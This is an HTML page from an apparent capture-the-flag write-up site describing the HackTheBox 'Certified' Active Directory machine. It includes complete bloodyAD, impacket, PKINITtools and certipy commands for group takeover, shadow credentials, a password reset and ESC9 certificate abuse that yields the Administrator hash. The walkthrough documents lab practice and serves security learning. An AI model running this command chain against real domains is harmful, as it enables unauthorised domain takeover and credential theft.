@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Certified - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <!-- Machine-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for Certified machine from HackTheBox - Medium difficulty level">
+    <meta name="keywords" content="HackTheBox, Certified, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../index.html" class="logo">All writeups</a>
+            <div class="header-controls">
+                <a href="#" class="htb-icon" title="Link to the main page(Coming soon!)">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="machine-list" id="easy-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="machine-list" id="medium-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="machine-list" id="hard-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="machine-list" id="insane-machines">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">Certified</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty medium">Medium</span>
+            <span class="date">March 15, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Machine-specific content goes here -->
+                <p><img alt="Certified" src="../images/Certified/pwned.png" /></p>
+<p>Certified is a medium-rated Active Directory machine that showcases Active Directory Certificate Services (AD CS) misconfigurations, specifically ESC9 (No Security Extension). The initial foothold is gained through BloodHound enumeration, revealing a misconfigured Management group. By leveraging GenericWrite permissions, shadow credentials are added to the management_svc account, which is then used to reset the password of ca_operator. Privilege escalation is achieved through ESC9, where a vulnerable certificate template allows requesting a certificate as Administrator. Using PKINIT authentication, the Administrator’s hash is extracted, granting full control over the domain. This machine highlights the risks of improper certificate template configurations and excessive permissions in AD environments.'</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Certified/nmap.png" /></p>
+<p>Initial nmap scan reveals that this is an Active Directory scenario. Distinguishable by certain ports and services.</p>
+<h2>Enumeration</h2>
+<p>Since I have initial credentials for judith.mader, I will try to enumerate the domain with bloodhound.</p>
+<p><img alt="bloodhoundput" src="../images/Certified/bloodhoundout.png" /></p>
+<p>Now I can insert the data into bloodhound and begin the enumeration.</p>
+<p><img alt="path" src="../images/Certified/path.png" /></p>
+<p><img alt="ca" src="../images/Certified/ca.png" /></p>
+<h2>Management_svc takeover</h2>
+<p>With the information I've gathered, I can devise a plan for taking over the domain.</p>
+<ol>
+<li>Making judith.mader the owner of the Management group.</li>
+<li>Leveraging the GenericWrite permission of the mentioned group against the svc account to generate shadow credentials.</li>
+<li>Using the svc account to reset the password of ca_operator.</li>
+<li>Using the ca_operator account to abuse certificates.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code>bloodyAD -d certified.htb -u judith.mader -p judith09 --dc-ip 10.10.11.41 set owner Management judith.mader - makes Judith the owner of the Management group.
+
+impacket-dacledit certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41 -principal judith.mader -target Management -action write -rights WriteMembers - grants Judith permission to add users into the Management group.
+
+bloodyAD -d certified.htb -u judith.mader -p judith09 --dc-ip 10.10.11.41 add groupMember Management judith.mader - adds Judith to the Management group.
+
+bloodyAD -d certified.htb -u judith.mader -p judith09 --dc-ip 10.10.11.41 add shadowCredentials management_svc - adds shadow credentials to the management_svc account.
+</code></pre></div>
+
+<p><img alt="shadowcreds" src="../images/Certified/shadowcreds.png" /></p>
+<p>I'll grab the PKINIttools repo now as it'll be very useful for further escalation. I'll try to get a TGT as it was mentioned above.</p>
+<p><img alt="asrepkey" src="../images/Certified/asrepkey.png" /></p>
+<p>I have the .ccache file now, but what interests me more is the AS-REP key. I'll be able to get the hash of management_svc with it.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">sudo</span><span class="w"> </span><span class="n">ntpdate</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.41</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">PKINITtools</span><span class="o">/</span><span class="n">getnthash</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">key</span><span class="w"> </span><span class="s1">&#39;f4a491c17a0c030ad9c4aa30d3b34a2afc21fa635a427eb1525d7f604f530590&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.41</span><span class="w"> </span><span class="n">certified</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">management_svc</span>
+
+<span class="n">Note</span><span class="p">:</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">ntpdate</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">here</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="n">kerberos</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">throwing</span><span class="w"> </span><span class="n">clock</span><span class="w"> </span><span class="n">skew</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">me</span><span class="o">.</span><span class="w"> </span><span class="n">Joining</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">together</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">intended</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">solved</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">issue</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">required</span><span class="w"> </span><span class="n">several</span><span class="w"> </span><span class="n">tries</span><span class="o">.</span>
+</code></pre></div>
+
+<p><img alt="nthash" src="../images/Certified/nthash.png" /></p>
+<p>With this hash in hand, I can remote into the machine and collect the user flag.</p>
+<h1>Root flag</h1>
+<h2>Discovering ESC9</h2>
+<div class="codehilite"><pre><span></span><code><span class="n">EXPORT</span><span class="w"> </span><span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/.</span><span class="n">ccache</span><span class="o">/</span><span class="n">file</span>
+<span class="n">sudo</span><span class="w"> </span><span class="n">ntpdate</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.41</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">bloodyAD</span><span class="w"> </span><span class="o">--</span><span class="n">host</span><span class="w"> </span><span class="n">DC01</span><span class="o">.</span><span class="n">certified</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">certified</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">--</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.41</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">ca_operator</span><span class="w"> </span><span class="n">password123</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Changes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">ca_operator</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="mf">123.</span><span class="w"> </span><span class="n">In</span><span class="w"> </span><span class="n">order</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">.</span><span class="n">ccache</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">$</span><span class="n">KRB5CCNAME</span><span class="w"> </span><span class="n">environmental</span><span class="w"> </span><span class="n">variable</span><span class="o">.</span>
+</code></pre></div>
+
+<p>I am going to use a tool called certipy-ad, in order to search for potentially dangerous certificates I could exploit.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">certipy</span><span class="o">-</span><span class="n">ad</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">-</span><span class="n">vulnerable</span><span class="w"> </span><span class="o">-</span><span class="n">stdout</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.41</span><span class="w"> </span><span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.41</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">ca_operator</span><span class="nv">@certified</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">password123</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for &#39;certified-DC01-CA&#39; via CSRA
+[!] Got error while trying to get CA configuration for &#39;certified-DC01-CA&#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for &#39;certified-DC01-CA&#39; via RRP
+[*] Got CA configuration for &#39;certified-DC01-CA&#39;
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : certified-DC01-CA
+    DNS Name                            : DC01.certified.htb
+    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
+    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
+    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
+    Certificate Validity End            : 2124-05-13 15:43:41+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : CERTIFIED.HTB\Administrators
+      Access Rights
+        ManageCertificates              : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        ManageCa                        : CERTIFIED.HTB\Administrators
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+        Enroll                          : CERTIFIED.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : CertifiedAuthentication
+    Display Name                        : Certified Authentication
+    Certificate Authorities             : certified-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectRequireDirectoryPath
+                                          SubjectAltRequireUpn
+    Enrollment Flag                     : NoSecurityExtension
+                                          AutoEnrollment
+                                          PublishToDs
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Server Authentication
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CERTIFIED.HTB\operator ca
+                                          CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : CERTIFIED.HTB\Administrator
+        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+                                          CERTIFIED.HTB\Administrator
+        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+                                          CERTIFIED.HTB\Administrator
+        Write Property Principals       : CERTIFIED.HTB\Domain Admins
+                                          CERTIFIED.HTB\Enterprise Admins
+                                          CERTIFIED.HTB\Administrator
+    [!] Vulnerabilities
+      ESC9                              : &#39;CERTIFIED.HTB\\operator ca&#39; can enroll and template has no security extension
+</code></pre></div>
+
+<p>The lack of security extensions here will allow me to make use of the 'CertifiedAuthentication' template to get the Administrator's hash!</p>
+<h2>Abusing ESC9</h2>
+<div class="codehilite"><pre><span></span><code><span class="n">certipy</span><span class="o">-</span><span class="n">ad</span><span class="w"> </span><span class="n">account</span><span class="w"> </span><span class="k">update</span><span class="w"> </span><span class="o">-</span><span class="n">username</span><span class="w"> </span><span class="n">management_svc</span><span class="nv">@certified</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="s1">&#39;a091c1832bcdd4677c28b5a6a1295584&#39;</span><span class="w"> </span><span class="o">-</span><span class="k">user</span><span class="w"> </span><span class="n">ca_operator</span><span class="w"> </span><span class="o">-</span><span class="n">upn</span><span class="w"> </span><span class="n">Administrator</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">Sets</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">ca_operator</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="n">Principal</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">Administrator</span><span class="p">.</span><span class="w"> </span><span class="n">Since</span><span class="w"> </span><span class="n">AD</span><span class="w"> </span><span class="n">CS</span><span class="w"> </span><span class="n">relies</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">UPN</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">issuing</span><span class="w"> </span><span class="n">certificates</span><span class="p">,</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">certificate</span><span class="w"> </span><span class="n">requested</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">ca_operator</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">issued</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">Administrator</span><span class="p">.</span>
+
+<span class="n">certipy</span><span class="o">-</span><span class="n">ad</span><span class="w"> </span><span class="n">req</span><span class="w"> </span><span class="o">-</span><span class="n">username</span><span class="w"> </span><span class="n">ca_operator</span><span class="nv">@certified</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">password123</span><span class="w"> </span><span class="o">-</span><span class="n">ca</span><span class="w"> </span><span class="n">certified</span><span class="o">-</span><span class="n">DC01</span><span class="o">-</span><span class="n">CA</span><span class="w"> </span><span class="o">-</span><span class="n">template</span><span class="w"> </span><span class="n">CertifiedAuthentication</span><span class="w"> </span><span class="o">-</span><span class="n">debug</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Requests</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">certificate</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">ca_operator</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">since</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">UPN</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="n">Administrator</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">issued</span><span class="w"> </span><span class="n">cert</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">belong</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">Administrator</span><span class="p">.</span>
+</code></pre></div>
+
+<p><img alt="pfx" src="../images/Certified/pfx.png" /></p>
+<p>I will use the extracted .pfx certificate to authenticate via PKINIT and retrieve the NTLM hash for Administrator.</p>
+<p><img alt="adminhash" src="../images/Certified/adminhash.png" /></p>
+<p>Success! Now I will remote into the pc as admin and get both flags.</p>
+<p><img alt="root" src="../images/Certified/root.png" /></p>
+<p>Rooted!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Machine metadata for sidebar population
+        let machineData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch machine metadata
+                const response = await fetch('../machines.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load machine metadata');
+                }
+                machineData = await response.json();
+                
+                // Populate the sidebar with machine links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with machine links dynamically
+        function populateSidebar() {
+            const categories = {
+                "easy": document.getElementById("easy-machines"),
+                "medium": document.getElementById("medium-machines"),
+                "hard": document.getElementById("hard-machines"),
+                "insane": document.getElementById("insane-machines")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add machine links to appropriate categories
+            for (const [machineName, data] of Object.entries(machineData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../machines/${machineName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current machine
+                    if (data.title === "Certified") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const machineList = document.querySelector(`#${difficulty}-machines`);
+                    
+                    machineList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
